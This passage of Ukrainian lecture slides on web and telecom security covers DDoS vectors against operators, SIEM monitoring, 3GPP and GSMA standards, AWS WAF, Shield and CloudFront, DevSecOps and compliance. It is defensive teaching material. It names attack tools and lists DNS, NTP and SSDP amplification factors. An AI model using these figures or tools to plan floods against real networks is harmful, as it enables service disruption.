| **SS7 Signal Flood** | SS7/SCTP | Кастомні інструменти | SS7 Firewall |
| **GTP Flood** | GTP/UDP | EPC Attack toolkit | GTP Firewall |
| **DNS Amplification** | DNS/UDP | Будь-який DNS resoler | RPF, rate limit |
| **RTP Flood** | RTP/UDP | RTPFlood | Медіа rate limit |
| **Volumetric** | IP | Ботнети | Anycast BGP, scrubbing |

### Amplification фактор

```
DNS:  запит 60 bytes → відповідь 3000 bytes → 50x amplification
NTP:  запит 8 bytes  → відповідь 468 bytes  → 58x amplification
SSDP: запит 30 bytes → відповідь 300 bytes  → 10x amplification
```

### Захист телеком-оператора від DDoS

- **Anycast BGP** — розподіл атаки по глобальній мережі
- **Scrubbing Centers** — очищення трафіку (Akamai, Cloudflare)
- **RTBH** (Remote Triggered Black Hole) — аварійне блокування
- **AWS Shield Advanced** — для хмарних компонентів телеком

---

<!-- ===== СЛАЙД 32: Моніторинг у телекомі ===== -->

## Моніторинг безпеки в телекомі

### Джерела даних для SIEM

| Джерело | Зміст | Цінність |
|---------|-------|---------|
| **CDR** (Call Detail Records) | Хто, кому, коли, скільки | Fraud detection |
| **SS7/Diameter трейси** | Сигнальні повідомлення | Атаки на протоколи |
| **NetFlow/IPFIX** | Мережевий трафік | DDoS, аномалії |
| **Syslog** | Логи мережевих елементів | Системні події |
| **API Logs** | Запити до BSS/OSS API | API abuse |
| **AWS CloudTrail** | AWS API виклики | Cloud-компоненти |

### Архітектура SIEM для телекому

```
Джерела → Kafka (streaming) → Elasticsearch/OpenSearch
         → Spark ML (anomaly detection)
         → Splunk/QRadar (SIEM correlation)
         → SOAR (автоматичне реагування)
```

### KPI безпеки (GSMA категорії)

- **MTTD** (Mean Time to Detect) — середній час виявлення
- **MTTR** (Mean Time to Respond) — середній час реагування
- **False Positive Rate** — % помилкових спрацювань

### SOAR для телекому

- Автоматичне блокування абонентів з IRSF поведінкою
- Автоматична відповідь на SS7 атаки
- Ticket creation для NOC/SOC

---

<!-- ===== СЛАЙД 33: Стандарти безпеки телекому ===== -->

## Стандарти та нормативна база телекому

| Стандарт | Організація | Сфера |
|----------|-------------|-------|
| **3GPP TS 33.501** | 3GPP | 5G безпека: SUPI/SUCI, SEPP, SBA |
| **3GPP TS 33.401** | 3GPP | LTE/EPS безпека |
| **3GPP TS 33.102** | 3GPP | 3G UMTS безпека |
| **GSMA FS.11** | GSMA | SS7 безпека — категорії загроз |
| **GSMA FS.19** | GSMA | Diameter безпека |
| **GSMA IR.77** | GSMA | GTP безпека |
| **GSMA FS.37** | GSMA | 5G безпека для операторів |
| **ETSI TS 33.x** | ETSI | Телеком безпека в ЄС |
| **ITU-T X.805** | ITU-T | Архітектура безпеки мереж |
| **NIST SP 800-187** | NIST | 4G LTE безпека |

### Регуляторна база

- **NIS2 Directive** (ЄС) — телеком як критична інфраструктура
- **BEREC Guidelines** — регулятор ЄС для електронних комунікацій
- **GDPR** — захист персональних даних абонентів
- **Закон України "Про електронні комунікації"** (2021)

### GSMA FASG

GSMA Fraud and Security Group — галузевий орган:
- Розробляє Security Guidelines та Best Practices
- Координує відповідь на глобальні загрози

---

<!-- ===== СЛАЙД 34: AWS WAF та Shield ===== -->

## AWS WAF та AWS Shield

### AWS WAF

AWS WAF — брандмауер веб-застосунків, інтегрується з ALB, CloudFront, API Gateway, AppSync.

| Компонент | Опис |
|-----------|------|
| **Web ACL** | Набір правил (до 10 000 WCUs) |
| **Managed Rules** | AWSManagedRulesCommonRuleSet, OWASP Core |
| **Rate-based Rules** | IP-обмеження за 5-хв вікном |
| **Bot Control** | Виявлення ботів, CAPTCHA |
| **Fraud Control** | Захист форм входу та реєстрації |

```bash
# Прив'язка WAF WebACL до API Gateway
aws wafv2 associate-web-acl \
  --web-acl-arn arn:aws:wafv2:...:webacl/MyACL/... \
  --resource-arn arn:aws:apigateway:...:../prod
```

### AWS Shield

| Рівень | Опис | Ціна |
|--------|------|------|
| **Shield Standard** | Базовий DDoS захист, автоматично | Безкоштовно |
| **Shield Advanced** | SRT (DDoS Response Team), cost protection | $3000/міс |

**Shield Advanced** захищає: CloudFront, Route 53, ELB, EC2 EIP, Global Accelerator

---

<!-- ===== СЛАЙД 35: CloudFront та DDoS-захист ===== -->

## Amazon CloudFront — безпека та DDoS-захист

### CloudFront як периметр безпеки

```
Користувач → CloudFront Edge (400+ PoP)
              ├── WAF (блокування на edge)
              ├── DDoS absorption (Shield)
              ├── TLS термінація (TLS 1.2+)
              ├── Geo-restriction
              └── Origin Protection (підпис запитів)
                    ↓
              Origin (ALB/API Gateway/S3)
```

### Захисні функції CloudFront

| Функція | Опис |
|---------|------|
| **Origin Shield** | Додатковий кешуючий шар → менше навантаження на origin |
| **Signed URLs/Cookies** | Захист private контенту з TTL та IP обмеженням |
| **Field-level Encryption** | Шифрування окремих полів форм (номер карти) |
| **HTTPS-only** | Redirect HTTP → HTTPS, TLS 1.2+ примусово |
| **WAF at Edge** | Блокування до origin — економія ресурсів |

### Origin Protection

```bash
# Origin дозволяє трафік лише від CloudFront
# через custom header X-Origin-Verify
aws cloudfront create-distribution \
  --origin-custom-headers X-Origin-Verify:SECRET_VALUE
```

### Для телекому

- Захист білінгових порталів та self-care
- CDN для static-контенту OTT/media
- DDoS захист сигнального шлюзу

---

<!-- ===== СЛАЙД 36: DevSecOps для веб та телеком ===== -->

## DevSecOps для веб та телеком-застосунків

### CI/CD Pipeline з безпекою

```
┌─ Pre-commit ──────────────────────────┐
│  GitLeaks (secrets) + pre-commit hooks│
└───────────────────────────────────────┘
         ↓
┌─ Build ───────────────────────────────┐
│  SAST: Semgrep, SonarQube             │
│  SCA:  OWASP Dependency-Check, Snyk   │
│  Container: Trivy (image scan)        │
└───────────────────────────────────────┘
         ↓
┌─ Test ────────────────────────────────┐
│  DAST: OWASP ZAP, Burp Enterprise    │
│  Protocol Fuzzing: Codenomicon/Spirent│
└───────────────────────────────────────┘
         ↓
┌─ Deploy ──────────────────────────────┐
│  IaC: Checkov, tfsec                  │
│  AWS Security Hub (compliance check)  │
└───────────────────────────────────────┘
         ↓
┌─ Runtime ─────────────────────────────┐
│  AWS WAF, GuardDuty, CloudWatch      │
│  Signaling Firewall (SS7/Diameter)    │
└───────────────────────────────────────┘
```

### Телеком-специфічне тестування

| Інструмент | Призначення |
|-----------|-------------|
| **Codenomicon Defensics** | Fuzzing SIP, Diameter, GTP, SS7 протоколів |
| **SIPVicious** | Тестування SIP безпеки |
| **Spirent Avalanche** | Load + security testing telecom |
| **Nessus/Qualys** | Scan мережевих елементів |

---

<!-- ===== СЛАЙД 37: Compliance та стандарти ===== -->

## Compliance та стандарти

### Веб-застосунки

| Стандарт | Опис | Ключові вимоги |
|----------|------|---------------|
| **PCI DSS v4.0** | Платіжні картки | Req 6: Secure software; Req 12: WAF |
| **GDPR** | Захист даних ЄС | Privacy by design, breach notification 72h |
| **OWASP ASVS** | Application Security Verification Standard | L1/L2/L3 рівні перевірки |
| **SOC 2 Type II** | Сервісні організації | CC6-CC9: Logical Access |

### Телеком

| Стандарт | Опис |
|----------|------|
| **NIS2 Directive** | Кібербезпека критичної інфраструктури ЄС (включає телеком) |
| **BEREC** | Регуляторні вимоги ЄС для електронних комунікацій |
| **3GPP TS 33.x** | Технічні специфікації безпеки мобільних мереж |
| **GSMA FASG** | Галузеві best practices для операторів |

### AWS Compliance Programs

- **PCI DSS** — AWS сертифікований як PCI DSS Level 1 SP
- **ISO 27001** — Міжнародний стандарт ISMS
- **SOC 2 Type II** — Аудит контролів безпеки
- **TISAX** — Automotive (важливо для V2X телеком)
- **CSA STAR** — Cloud Security Alliance

> Використовуйте **AWS Artifact** для завантаження compliance звітів

---

<!-- ===== СЛАЙД 38: Підсумок та питання ===== -->

## Підсумок лекції

### Ключові висновки

**Безпека веб-застосунків :**
- OWASP Top 10 — основа знань розробника та аудитора
- Injection, XSS, CSRF, SSRF — найпоширеніші вектори атак
- WAF + TLS + DevSecOps — шари захисту в combination

**Безпека телекому :**
- SS7/Diameter — старі протоколи з системними вразливостями → потрібні фаєрволи
- 5G — кращий захист (SUCI, SEPP, OAuth 2.0), але нові вектори атак
- Телеком-шахрайство: $38.95B/рік — реальна фінансова загроза

**Хмара та DevSecOps :**
- AWS WAF + Shield + CloudFront — хмарний периметр
- Shift-left: SAST+SCA в CI, DAST на staging
- NIS2 + GSMA FS.11 — регуляторна відповідність

### Зв'язки з іншими лекціями

| Лекція | Зв'язок |
|--------|---------|
| ← **Лекція 6** | Безпека контейнерів (WAF, API Gateway, EKS) |
| → **Лекція 8** | Моніторинг та виявлення загроз (SIEM, GuardDuty, Falco) |

---

# Питання?

> *"Security is not a product, but a process."*
> — Bruce Schneier


